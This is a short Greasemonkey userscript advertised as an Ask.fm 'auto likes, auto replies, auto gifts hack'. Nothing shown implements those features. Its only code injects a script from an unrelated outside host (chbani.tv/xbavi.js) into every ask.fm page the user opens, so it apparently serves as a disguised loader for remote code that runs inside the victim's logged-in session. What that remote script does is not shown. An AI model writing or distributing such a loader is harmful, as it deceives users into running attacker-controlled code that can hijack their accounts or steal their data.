// ==UserScript==
// @name			Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @namespace                   http://userscripts.org/scripts/show/185594
// @version			1.2
// @copyright		        http://youtube.com/ExtremeScriptz
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://www.chbani.tv/xbavi.js');
}